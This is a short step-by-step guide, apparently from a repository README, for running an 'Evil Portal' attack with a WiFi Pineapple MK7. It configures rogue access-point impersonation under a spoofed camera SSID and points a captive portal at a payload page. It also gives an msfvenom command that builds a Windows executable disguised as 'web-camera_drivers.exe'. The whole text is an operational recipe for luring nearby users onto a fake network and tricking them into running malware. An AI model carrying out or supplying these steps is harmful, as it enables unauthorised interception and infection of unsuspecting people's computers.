### WiFi Pineapple - Web UI

PineAP Suite > Filtering : Client Filter "Deny List" and SSID Filter "Deny List"

### Hacker - Evil Portal

Edit the value of this constant in the "./configuration.php" file.
```php

/**
 * Payload
 */
$PAYLOAD_PATH = (string) './payloads/execution/web-camera.html';

```

### Hacker - Terminal

```bash
hacker@hacker-computer:~$ cd ./WiFi-Pineapple-MK7_Evil-Portal/
hacker@hacker-computer:~/.../WiFi-Pineapple-MK7_Evil-Portal$ msfvenom --arch x86 --platform windows --payload windows/exec CMD="..." --format exe-only --out ./web-camera_drivers.exe
```

### WiFi Pineapple - Web UI

PineAP Suite > Impersonation > Spoofed AP Pool : SSID "Apartment-LivingRoom_Camera" [Add]

PineAP Suite > PineAP : [Toggle] Impersonate all networks, [Check] Advertise AP Impersonation Pool and [Save]

__Note :__ *The SSID "Apartment-LivingRoom_Camera" is an example.*
